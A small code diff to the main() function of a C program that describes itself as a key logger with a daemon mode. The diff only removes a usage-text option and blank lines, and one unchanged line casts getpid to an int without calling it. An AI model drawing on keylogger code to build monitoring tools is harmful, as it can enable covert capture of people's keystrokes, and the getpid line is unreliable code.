@@ -55,7 +55,6 @@ int main(int argc, char **argv) {
                         " Usage: [OPTION]...\n"
                         "  -l, --log-file <file>  write log to FILE (default=/var/log/MD-key-logger.log)\n"
                         "  -d, --daemon  run as daemon\n"
-                        "  -p, --pid  get process id\n"
                         "  -h, --help    show this message\n"
                         "  \n");
                 return EXIT_SUCCESS;
@@ -91,7 +90,6 @@ int main(int argc, char **argv) {
 
     if (daemon_mod) {
         if (change_task_to_background() == 0) {
-            
             fprintf(stderr, "Process ID = %d \n", (int)getpid);
             printf("Process ID = %d \n", (int)getpid);
         } else {
@@ -99,7 +97,6 @@ int main(int argc, char **argv) {
             perror("Error");
         }
     }
-
 
     get_time_now(time_string);
     fprintf(log, "\n Starting key logger: %s\n", time_string);
